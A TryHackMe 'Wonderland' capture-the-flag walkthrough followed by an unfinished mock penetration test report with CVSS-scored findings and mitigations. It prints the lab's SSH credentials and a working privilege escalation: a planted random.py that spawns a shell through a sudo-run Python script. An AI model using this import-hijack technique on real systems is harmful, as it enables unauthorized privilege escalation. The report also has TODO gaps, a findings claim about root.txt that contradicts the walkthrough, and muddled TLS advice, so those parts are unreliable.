# Alice in Wonderland

https://tryhackme.com/room/wonderland

## Prerequisites

- You are given an IP address
- It is our task to find `user.txt` and `root.txt` on the machine

## Procedure & Tools

### Nmap

- We start by scanning the IP address with nmap
- Thereby we can find open ports and services running on the machine
- --> Easy reconnaissance for servers

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV 10.10.203.188
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 20:32 CET
Nmap scan report for 10.10.203.188
Host is up (0.080s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.29 seconds
```

- We find that there are two open ports, 22 and 80
- In the background I am also running `sudo nmap -sV --script vuln 10.10.203.188` to find vulnerabilities on the machine

- Analyzing the web server on port 80 via the browser
- The page is very static, not a lot of information 
  - Also looking at the source code does not reveal anything interesting

### OWASP Dirbuster

- We can use OWASP Dirbuster to find hidden directories on the web server
- We do this by using the GUI using a wordlist from /danielmiessler/SecLists
- We find multiple hidden directories including /r, /r/a, /r/a/b etc.
  - The important directory is /r/a/b/b/i/t
- The page is static too
- --> In the source code we find a hidden <p> tag with the text `<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`
  - This is a hint for the username and password for the SSH server running on port 22

### Examining the server

- We can use the found credentials to log into the SSH server
- We can use the following command to log in
  - `ssh alice@10.10.203.188`
- We gain shell access as the user `alice`
- We run `ls` to gain an overview of the files in the directory

```bash
alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 Feb 26 19:51 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

- Sadly, we do not have access to the `root.txt` file
- The python file does not seem to be interesting at first

### Finding user.txt
- `find / -name user.txt` does not return anything
- Using the hint on TryHackMe, we find that the flag is located in `/root/user.txt`
  - We can only read the file but do not have access to /root so `find` did not return anything
--> We gain the first flag

### Privilege Escalation

- Using `sudo -l` we find the command that our current user `alice` can run using `sudo`
  - We find that we can run the previously mentioned python file as the user `rabbit`

```bash
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

- First I was stuck here because it was not clear how running the python file would help me
- Further analysis reveals that the `import random` in the file can be abused using relative imports in python

```bash
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.
[...]
```

- We therefore create a new file `random.py` that is imported by the script
- We can thereby execute arbitrary code as the user `rabbit`
```python
import os
os.system("/bin/bash")
```
- This starts a shell as the user `rabbit`

## Tooling

During the process of creating the exploit, we used several tools to help us. Here is a list of the most important ones:
- Nmap: Network Mapper to scan the target machine for open ports and services
- OWASP Dirbuster: Tool to find hidden directories on a web server

### Evaluation of the Tools

- `nmap`
  - Nmap is a very capable and easy tool to scan a target machine for open ports and services. 
  - It is expandable and can even be used to find vulnerabilities on the target machine, thereby possibly saving time and effort.
  - It has a great documentation wide spread community support.
  - Thereby it is very efficient for mosts tasks. Specialized tools for specific tasks might be more efficient but Nmap is a great allrounder.
- OWASP Dirbuster
  - OWASP Dirbuster is a easy to use tool to find hidden directories on a web server using wordlists. 
  - Since one needs to supply a wordlist, it is not as efficient as other tools that come with a built-in wordlist.
  - Professional tools like Burp Suite might can more efficient but OWASP Dirbuster is a great tool for beginners and small tasks, especially since it is open source and free.

# Penetration Test Report

In this section I want to approach this TryHackMe room as if one were a penetration tester testing a client machine. 

*Note: Normally the test scope and methodology are explained in a penetration test report. This will be omitted here for obvious reasons.*

## Executive Summary

Bengt Wegner was tasked to perform a penetration test towards the TryHackMe machine "Alice in Wonderland". 

TODO

## Results

During the penetration test, I have found TODO vulnerabilities on the target machine. 

The following is a detailed description of the vulnerabilities and the advise to mitigate them.

### 1. TLS not used on web server `10.10.203.188:80`

- [CVSS:3.1 AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C&version=3.1)
- Severity: 6.1 (Medium)

#### Description

The web server does not use TLS to encrypt the communication between the client and the server. This makes the server vulnerable to man-in-the-middle attacks. An attacker can impersonate the domain, thereby intercepting sensitive information which he could use to compromise the server.

#### Risk

Sensitive information such as passwords or user data can be leaked to an attacker. This might lead to the compromise of user accounts.

Still, the likelihood of an attack is low since the attacker needs to be in the same network as the client or find another way to intercept the communication between the client and the server.

**Therefore, the risk is rated as medium.**

#### Advise 

- Use TLS to encrypt the communication between the client and the server using encryption algorithms such as ED25519 or RSA with a high key length.
- Use a valid certificate from a trusted certificate authority.

### 2. Service Information Disclosure on `10.10.203.188`

- [CVSS:3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&version=3.1)
- Severity: 5.3 (Medium)


#### Description

The web server discloses the version of the software it is running. This information can be used by an attacker to find vulnerabilities in outdated or vulnerable software. This shortens the time an attacker needs to find a vulnerability and exploit it.

#### Risk 

An attacker can use this information to find vulnerabilities in the software running on the server. This can lead to multiple attacks.

The likelihood of an attack is low since the attacker needs to find a vulnerability in the software running on the server.

**Therefore, the risk is rated as low.**

#### Advise

- Disclose as little information as possible about the software running on the server. Most modern services provide configuration options to hide information.
- Regularly update the software to the latest version to mitigate the risk of an attack, even if the version is disclosed.

### 3. Insecure SSH Authentication (Password) for User `alice`

- [CVSS:3.1 AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N&version=3.1)
- Severity: 6.1 (Medium)

#### Description

User `alice` is allowed to connect to the server using insecure [SSH password authentication](https://datatracker.ietf.org/doc/html/rfc4252#section-8). This allows for brute force attacks and unauthorized access to the server, especially if the password is weak.

#### Risk

An attacker may gain unauthorized access to the server. This may lead to data breaches, unauthorized access to sensitive data and modification of data.

Since brute force attacks are possible but slow and phishing requires a lot of effort, the likelihood of this finding being exploited is low. 

**The risk is therefore also low.**

#### Advise

- Use secure SSH authentication methods such as public key authentication.
  - Secure private keys with strong passphrases on the client side.
- If the need for password authentication remains, enforce strong password policies for all users.

### 4. Sensitive Information in Hidden Directory `/r/a/b/b/i/t`

- [CVSS:3.1 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N&version=3.1)
- Severity: 8.6 (High)

#### Description

The web server had hidden directories that could be found using OWASP Dirbuster. The directory `/r/a/b/b/i/t` contains the SSH login data for the user `alice` to a server. This information can be used by an attacker to gain unauthorized access to the server.

#### Risk

An attacker can use the found credential to gain unauthorized access to the server. This can lead to compromise of user data and other sensitive information on the server.

The likelihood of this finding being exploited is high since tools like OWASP Dirbuster can be used to find the hidden directories in a short amount of time.

**The risk is therefore rated as high.**

#### Advise

- Do not store sensitive information by hiding it in directories. Security through obscurity is not a valid security measure.
- Use proper identity and access management to manage access.

### 5. Insecure File Permissions on `root.txt`

- [CVSS:3.1 AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N&version=3.1)
- Severity: 6.5 (Medium)

#### Description

The file `root.txt` has the wrong file permissions and can be read by the user `alice`. Most likely, this is a violation of the principle of least privilege and can lead to unauthorized access to sensitive information.

#### Risk

Sensitive information can be read by unauthorized users. 

The likelihood of this finding being exploited is medium since the user `alice` needs to find the file and read it.

**The risk is therefore rated as medium.**

#### Advise

- Use the principle of least privilege and only grant access to files and directories that are necessary for the user to perform their tasks.
- Perform regular audits of file permissions to ensure that they are set correctly, possibly using automated tools.

### 6. Insecure `sudo` configuration for User `alice`

- [CVSS:3.1 AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N&version=3.1)
- Severity: 7.5 (High)

#### Description

The user `alice` can run the python file as the user `rabbit` using `sudo`. This can lead to impersonation and possibly privilege escalation. Since the python files relative imports can be abused, this can lead to arbitrary code execution as the user `rabbit`.

#### Risk

The user `alice` can execute arbitrary code as the user `rabbit`, leading to disclosure of sensitive information and loss of data integrity of the user `rabbit`.

The likelihood of this finding being exploited is low since the attacker needs to gain control of the user `alice` first. 

**The risk is therefore rated as medium.**

#### Advise

- Do not allows unprivileged users to act in behalf of other users. Use user groups and roles to manage access to files.
- Use the principle of least privilege to restrict access to sensitive commands and files.

